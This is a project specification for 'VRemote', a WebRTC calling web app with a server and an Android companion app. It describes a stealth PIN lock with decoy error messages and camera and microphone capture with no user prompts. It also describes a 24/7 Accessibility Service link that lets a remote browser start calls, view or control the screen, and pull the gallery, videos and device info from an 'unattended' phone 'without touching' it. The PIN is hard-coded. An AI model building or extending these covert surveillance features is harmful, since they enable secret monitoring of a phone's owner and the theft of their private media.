# VRemote — Complete Frontend & Backend Architecture, Rules & Flow Specification

> **PURPOSE OF THIS SPECIFICATION:**
> This document defines the exact architecture, rules, lifecycle, and communication flows of **VRemote** across both **Frontend (Client Web & In-App UI)** and **Backend (`server.js` & Signaling Infrastructure)**.
> Any AI agent, developer, or automated pipeline modifying, debugging, or adding code must follow these specifications strictly. Under no circumstances should any bug fix or modification deviate from or break the flows documented here.

---

# PART 1: FRONTEND RULES & FLOWS (Client Web & Web UI)

## 1. Directory Synchronization Rule: `public/` & `app/` 100% Sync
- `public/`: Live web assets directory served by the Node.js server.
- `app/`: Offline/embedded asset directory bundled into the Android APK.
- **Rule:** Every modification to HTML (`index.html`), CSS (`css/style.css`), or JavaScript (`js/main.js`) **must be applied identically to both `public/` and `app/`**. At all times, running `diff -r public app` must return zero differences.

---

## 2. Session Initialization & Instant Lock Bypass Flow
```
User navigates to website URL
       │
       ▼
Does URL contain UID parameter? (?uid=xxx, ?ui=xxx, ?id=xxx, or #uid=xxx)
       ├──► YES ──► Instant Lock Screen Bypass (html.bypass-lock class added in <head>)
       │            Auto-create User with UID prefix
       │            Instantly acquire Camera & Microphone (multi-tier fallback)
       │            Render live local preview (top-right box, mirrored, muted)
       │            Auto-connect to deal partner if peer with matching base UID exists
       │
       └──► NO  ──► Display Stealth Security PIN Lock Overlay
                    Wait for user to enter correct PIN (PIN: 7861 with 1200ms hold)
                    On correct PIN + 1200ms hold -> activate full app session & media
                    On incorrect PIN / short tap -> shake error & "Error: Try again later after 10 minutes"
```
1. **Instant Bypass:** Inline script in `<head>` executes before DOM render. If any key (`uid`, `ui`, `id`, `u`, `user`, `room`, `deal`, `token`, etc.) exists in query or hash, it sets `document.documentElement.classList.add('bypass-lock')` and conceals `#security-lock-screen`.
2. **Instant Media Acquisition:** Camera and microphone hardware activate immediately with zero user prompts, zero manual clicks, and zero delays. Multi-tier acquisition ensures the camera preview is visible on page load and never drops into an audio-only fallback.
3. **Auto-Call Matching:** If a peer with matching base UID (e.g. `7_caller` and `7_callee`) is already online in the room, the second peer automatically initiates the call connection.

---

## 3. Hardware Camera & Microphone Privacy Policy (Idle vs In-Call)
```
State: Idle (NO active call)
       │
       ├─► Tab switch / Chrome minimized / Window blur:
       │     └─► IMMEDIATELY stop all media tracks (track.stop())
       │     └─► Hardware camera LED & browser green dot turn OFF completely
       │
       └─► Return to tab / Chrome restored / Window focus:
             └─► AUTOMATICALLY re-acquire camera & mic
             └─► Resume live local preview without manual clicks

State: Active Call (peerConnection connected)
       │
       └─► Tab switch / Chrome minimized / Window blur:
             └─► Call, camera, mic and audio CONTINUE running 100% in background
             └─► Streaming NEVER interrupts or pauses
```
- **Idle Privacy:** In the idle state, privacy is paramount. Camera and microphone hardware must be completely released (`track.stop()`) when the user switches tabs, minimizes the window, or loses window focus (`window.onblur`).
- **Call Continuity:** Once an active call is connected (`activePeer && peerConnection`), background audio/video streaming is mandatory.

---

## 4. Picture-in-Picture (PiP) Policy: Strictly Manual Only (Live Calls Only)
- **Rule:** Picture-in-Picture (PiP) **NEVER** opens automatically on tab switch, window minimize, or call connect.
- **Trigger:** PiP can **ONLY** be entered when the user explicitly clicks the Picture-in-Picture button inside the More popover menu (`#btn-dock-more` -> `#more-item-pip`).
- **Dynamic Stream Selection:** PiP dynamically targets `remoteVideo` (if remote live stream is playing in an active video call) or `localVideo` (if idle or self-view).
- **STRICT PROHIBITION ON CHAT MEDIA (VIDEOS & IMAGES):**
  - Media files (videos and photos) sent or received in the Chat Drawer/Screen **CANNOT and MUST NEVER enter Picture-in-Picture mode under any circumstances**.
  - All chat videos MUST have `disablePictureInPicture = true`, `disableRemotePlayback`, and `controlslist="nodownload nopip"` applied.
  - Native browser PiP controls (`::-webkit-media-controls-picture-in-picture-button`) are completely hidden via CSS.
  - Context menu (`oncontextmenu`) is disabled on all chat videos and preview images to block browser context menu PiP triggers.
  - Chat videos MUST play **directly inside the chat message bubble**.
  - **Video Loading Progress Bar:** While a video is loading/buffering in chat, an animated loading card with a sliding gradient progress bar (`.chat-video-progress-bar`) is displayed underneath the header. Once buffering completes, the progress bar and loader fade out and the video player is displayed immediately for in-chat playback.

---

## 5. Incoming Call Alert Flow (Stealth Minimal Bar & Hold-to-Accept)
```
Incoming Call Offer Received
       │
       ▼
Display minimal bar (#incoming-call-bar): [Phone Icon] : [ID] : [X Icon]
Synthesized melodic chime rings (2-second interval)
Floating red "End Call" button remains strictly HIDDEN (no overlap)
       │
       ├──► User Taps/Clicks Phone Icon (< 450ms):
       │      ├─► Call is NOT accepted
       │      ├─► Phone icon shakes (.shake-error)
       │      ├─► Subtle haptic vibration (50ms)
       │      └─► Decoy error toast appears: "error: try after 10 minutes"
       │
       ├──► User Holds Phone Icon (>= 450ms):
       │      ├─► Button glows (.holding)
       │      ├─► Full confirmation vibration ([40, 60, 40])
       │      ├─► Call is accepted (acceptIncomingCall())
       │      ├─► Ringing chime stops
       │      └─► Floating End Call button appears
       │
       └──► User Clicks Decline (X Icon):
              ├─► Sends end-call signal to caller
              ├─► Stops chime & hides incoming bar
              └─► Returns cleanly to idle
```
- **Decoy Protection:** Single tap does not accept the call and displays `error: try after 10 minutes`. This prevents accidental answers and conceals the true hold mechanism from unauthorized onlookers.
- **Hold Duration:** Exact threshold is `HOLD_ACCEPT_MS = 450ms`.
- **No Overlap:** `#floating-end-call-btn` is excluded during `incomingCallData` so the minimal incoming bar `: ID :` is unobstructed.

---

## 6. Bottom Controls Dock & Floating Buttons Architecture
### A. Bottom Dock (`#call-controls`)
The dock consists of two primary zones:
1. **Scrollable Action Area (`.controls-scroll-wrapper`):**
   - Camera Toggle (`#toggle-camera`): `fas fa-user` (active) / `fas fa-user-slash` (muted).
   - Mic Toggle (`#toggle-mic`): `fas fa-microphone` / `fas fa-microphone-slash`.
   - Call Mode Switch (`#toggle-call-mode`): switches between Audio Call and Video Call modes.
   - Screen Share (`#toggle-screen`): triggers native or web screen sharing.
   - Chat Drawer (`#btn-dock-chat`): opens chat sliding drawer.
   - Participants Drawer (`#btn-dock-participants`): opens participant list.
   - More Popover Menu (`#btn-dock-more`): PiP, Flip Camera, Mute Speaker, Audio Output.
   - Settings (`#toggle-more-menu`): bitrates, resolutions, diagnostics.
2. **Vertical Divider & Static Action (`.controls-static-action`):**
   - **ONLY** the dropdown chevron button (`#btn-collapse-bar`) exists here.

### B. Collapse & Expand Gestures
- **Collapse:** Clicking the dropdown chevron collapses the dock into a minimal bottom tab (`#btn-expand-bar`).
- **Expand:**
  - Clicking the expand tab.
  - **Press & hold bottom edge for 380ms** (supports touchscreens with 16px jitter tolerance so slight finger movements do not cancel the expand).

### C. Floating End Call Button (`#floating-end-call-btn`)
- Floats above the dock.
- Only visible when:
  - An outgoing call is ringing (`callingPeer`), OR
  - A call is actively connected (`activePeer || (peerConnection && connected)`).
- Automatically adjusts position when dock collapses (`.dock-collapsed`).
- Strictly hidden during incoming call alerts.

---

## 7. Dynamic Audio ↔ Video Mode Switching with Receiver Privacy Guard
```
User 1 clicks "Call Mode" button (Audio -> Video)
       │
       ▼
Socket emits "call-mode-change" { mode: "video" }
       │
       ├─► User 1 (Initiator Side):
       │     ├─► Camera turns ON immediately
       │     ├─► Video stream transmitted to User 2
       │     └─► Shows Video Call UI
       │
       └─► User 2 (Receiver Side — PRIVACY GUARD):
             ├─► Receives remote video of User 1
             ├─► User 2's local camera stays MUTED / OFF
             ├─► User 2's camera icon changes to slashed: fas fa-user-slash
             └─► User 2's video ONLY streams when User 2 explicitly clicks
                 the slashed icon to un-slash (fas fa-user), giving consent!
```
- **Audio Call Mode:**
  - Top-right local camera box (`#local-video-container`) is hidden (`display: none !important;`).
  - Audio calling card with animated voice wave rings appears.
- **Switch to Video Mode:**
  - User 1's camera activates.
  - User 2's camera remains blocked/slashed until explicit manual toggle. User 2's privacy is protected at all costs.

---

# PART 2: BACKEND RULES & FLOWS (`server.js` & Signaling System)

## 1. Dual Socket Model & Device Registry (`deviceRegistry`)
Every unattended companion Android device runs two socket connections simultaneously:
1. **Background Socket (`role: "background_service"`):** Connected 24/7 via Android Accessibility Service (`RemoteAccessibilityService`). Handles screen waking, activity launching, gallery queries, and device info queries.
2. **Companion Socket (`role: "companion"`):** Connected while `MainActivity` is active for WebRTC media streaming and touch injection.

### Server Implementation Rules:
- **`deviceRegistry` Map:** Keyed by permanent `deviceId` (e.g. SHA-256 derived from Android ID + Hardware Model).
- **Socket Tracking via `Set`:** Each registered device entry maintains a `sockets: new Set()` containing all active socket IDs for that device.
- **Disconnect Cleanup Rule:** When a socket disconnects:
  - `server.js` removes ONLY that specific socket ID from `existing.sockets`.
  - If `existing.sockets.size > 0` (e.g. background service socket is still alive), **`existing.online` MUST REMAIN `true`**.
  - `existing.socketId` automatically falls back to the remaining active socket (`Array.from(existing.sockets)[0]`).
  - Device action buttons (Call, Video, Screen Share, Gallery, Videos, Info) remain fully enabled and clickable on the web frontend.
- **Dead Socket Pruning:** On every `register-device` event, `server.js` checks each socket in `existing.sockets` against `io.sockets.sockets.get(sid)` and deletes orphaned or disconnected sockets.

---

## 2. Room & User Management (`usersBySocket` & `allUsers`)
- `usersBySocket` maps each socket ID to `{ username, joinedAt, ip, ... }`.
- When a user emits `join-user`:
  1. `server.js` associates the username with the socket.
  2. Broadcasts updated `joined` user list to all connected clients.
- **Base UID Matching:**
  - Usernames formatted as `{baseUid}_{role}` (e.g. `7_caller`, `7_callee`) share a common base UID (`username.split('_')[0]`).
  - Used by frontend logic to pair deal partners automatically upon entering the room.
- On socket disconnect:
  1. Removes the socket entry from `usersBySocket`.
  2. Broadcasts the updated user list via `joined` to all clients.

---

## 3. WebRTC Signaling Relay
`server.js` acts as an ultra-fast, zero-tamper signaling relay for WebRTC negotiation:
1. **`offer`:** Relays SDP offer from caller to callee (`io.to(targetSocketId).emit("offer", data)`).
2. **`answer`:** Relays SDP answer from callee back to caller.
3. **`icecandidate`:** Relays ICE candidates between peers for NAT traversal and direct media path establishment.
4. **Target Resolution (`findTargetSocketId`):**
   - Resolves target by direct socket ID.
   - If target is a username, resolves socket ID via `usersBySocket`.
   - If target is a base UID (e.g. `7`), matches any active peer whose username starts with `7_`.

---

## 4. Guaranteed Dual-Side `end-call` Routing
When either party terminates or declines a call, the `end-call` event must reach the partner without fail:
```
Client emits: socket.emit("end-call", { from, to })
       │
       ▼
Is 'to' a registered deviceId?
  ├──► YES ──► Relay "end-call" & "end_call" auto-command to all sockets in dev.sockets
  │
  └──► NO  ──► Search usersBySocket:
                 1. Exact username match: uName === to
                 2. Direct socket ID match: sId === to
                 3. Case-insensitive match: uName.toLowerCase() === to.toLowerCase()
                 4. Base UID match: uClean === cleanTo (e.g. "7" matches "7_receiver")
                 5. Fallback: If no match and to === "all", broadcast to everyone
```
- **Result:** Both peers terminate peer connections, stop remote tracks, clear ringtones, hide active call bars/floating buttons, and return to idle. Neither side remains hung or orphaned.

---

## 5. In-Call Signaling Controls
1. **`call-mode-change`:**
   - Emitted with `{ from, to, mode: "audio" | "video", initiator }`.
   - Relayed to target socket or matching base UID partner.
   - Synchronizes UI state while respecting receiver privacy guard.
2. **`peer-video-state`:**
   - Emitted when a peer toggles their local video track ON/OFF (`videoEnabled: true | false`).
   - Relayed to partner to update remote video overlay / avatar rings.
3. **`chat-message` & `chat-reaction`:**
   - Relays text, image/video previews, document payloads, and emoji reactions between room participants.

---

## 6. Auto-Command Dispatch & Media Bridge Relay
Used by the web frontend to remotely command unattended Android devices:
1. **`auto-command`:**
   - Client sends `{ targetDeviceId, command, caller, cameraChoice, page, mediaId }`.
   - Supported commands: `audio_call`, `video_call`, `screen_share`, `screen_share_control`, `end_call`, `get_device_info`, `get_gallery`, `get_videos`, `get_media_detail`.
   - `server.js` dispatches the command to all active sockets of the target device (`dev.sockets`).
2. **`gallery-chunk` & `device-info-response` Relay:**
   - Relays chunked gallery/video photo thumbnails and device hardware specifications from the Android companion device socket directly to the requesting browser socket ID (`targetSocketId`).

---

## 7. HTTP & Asset Delivery
- Serves static web frontend from `/public`.
- Endpoints:
  - `/`: Main meeting application.
  - `/downloads/vremote.apk`: Direct binary download for latest compiled Android release APK.
- Cache headers configured for immediate update upon version bumps (`?v=6.2`).
- Process managed by PM2 on VPS (`v-webrtc`, ID 0).

---

## 8. Drawer Views Architecture: Participants vs. Registered Devices Separation
Inside the sliding drawer (`#drawer-view`), users toggle between two distinct views using the info icon (`#btn-view-registered-devices`):
1. **Participants View (`#drawer-participants-view`):**
   - Displays the `#drawer-user-box` containing the user's Display Name input, Room/User ID box, and Join/Update button.
   - Lists active room participants (`#participants-list`).
2. **Registered Devices View (`#drawer-registered-devices-view`):**
   - **Strict UI Cleanliness Rule:** The `#drawer-user-box` (Display Name input, Search/Join box) is **COMPLETELY HIDDEN** (`display: none !important;`).
   - Contains ONLY the registered Android devices cards (`#registered-devices-list`).
   - Devices auto-register when the VRemote app connects.
   - Shows device name, RAM info, permanent device ID, online/offline status, and action buttons.

---

## 9. Registered Device Connection Lifecycle & Orange Error Reporting

### 1. The Core Lifecycle
To prevent false "Connected" confirmations when a remote phone is offline, unresponsive, or fails to establish a media session:

1. **Triggering Action (Audio, Video, Share, Control, Gallery, Videos):**
   - Clicked button transitions to `.btn-action-loading` with a spinning loader (`<i class="fas fa-circle-notch fa-spin"></i>`) and `Connecting...` label.
   - `#session-connecting-bar-${safeId}` becomes visible under the action buttons with an active spinner and a "Cancel" button.
   - A 20-second timeout timer starts.
   - **Crucial Rule:** The device is **NEVER** marked as `Connected` on button click. `activeSessionDevices.add(deviceId)` is strictly withheld until real WebRTC or socket stream confirmation.

2. **Connection Success (`notifyDeviceConnectionSuccess`):**
   - Triggered ONLY when:
     - WebRTC ICE connection reaches `connected` / `completed`.
     - `acceptRegisteredDeviceCall` or `acceptScreenShareStream` sets local answer SDP and begins streaming tracks.
     - `gallery-chunk` payload arrives from device.
   - Actions:
     - Cancels the 20s timeout timer.
     - Clears button loaders (`resetDeviceButtonLoaders`).
     - Hides `#session-connecting-bar-${safeId}`.
     - Displays `#session-active-bar-${safeId}` with green pulsing dot, "Connected", and red Disconnect button.
     - Displays green "Connected" badge `#session-badge-${safeId}` in the device header.

3. **Connection Failure & Orange Reason Display (`notifyDeviceConnectionFailure`):**
   - Triggered when:
     - Server emits `auto-command-dispatched` with `success: false` (Device offline or not registered).
     - Android app emits `device-error` with specific message (e.g. "Screen capture permission was cancelled on phone", "Phone background launch failed", "WebRTC ICE connection failed").
     - 20-second timeout expires ("Connection timed out: Phone not responding (App may be closed or phone off)").
   - Actions:
     - Cancels timeout timer.
     - Reverts button loaders; clicked button receives `.btn-action-failed` with orange icon and orange "Failed" text.
     - Hides `#session-connecting-bar-${safeId}`.
     - Replaces the "Without touching phone" hint text directly with the exact failure reason in **clean ORANGE text (`color: #ff9f0a; font-weight: 600;`)** with NO outline and NO background box to save card vertical space.
     - Emits user-facing toast with failure reason.

---

## 10. Summary of Critical Constants & Contract Bindings

| Domain | Constant / Event | Value / Rule |
|---|---|---|
| **Frontend** | `SECURITY_PIN` | `"7861"` (`HOLD_SECURITY_MS = 1200ms` on `#btn-security-back`) |
| **Frontend** | `HOLD_ACCEPT_MS` | `450ms` (press & hold to answer) |
| **Frontend** | Decoy Toast | `"error: try after 10 minutes"` (on click/tap < 450ms or wrong PIN) |
| **Frontend** | `HOLD_EXPAND_MS` | `380ms` (16px touch jitter tolerance) |
| **Frontend** | Cache Bumper | `?v=6.4.6` (in index.html script & css tags) |
| **Frontend** | APK Version Badge | `v6.4.6 (Latest)` in screen share download modal |
| **Frontend** | Drawer Separation | `#drawer-user-box` hidden in registered devices view |
| **Frontend** | Device Connection | Connecting loader on button; in-place orange error text (`#ff9f0a`) on failure |
| **Frontend** | PiP Mode | Strictly manual click inside `#btn-dock-more` popover |
| **Frontend** | Chat Media | Strictly inline in message bubble; no PiP; animated progress bar loader |
| **Frontend** | Mode Switch | Audio mode hides `#local-video-container`; Video mode preserves User 2 privacy |
| **Android** | WorkManager KeepAlive | 15-30 min `KeepAliveWorker` wakes socket & re-registers across OEMs |
| **Android** | Coturn TURN | VPS `turn:201.18.218.29:3478` (UDP/TCP) + OpenRelay fallback |
| **Backend** | Device Registry | `device.sockets = new Set()` tracks background & companion sockets |
| **Backend** | Offline Rule | Device stays `online = true` as long as `sockets.size > 0` |
| **Backend** | `device-error` Relay | Relays exact device failure reasons to requesting web client |
| **Backend** | Command Broadcast | Never broadcast `end_call` to all devices; target specific peer/session only |
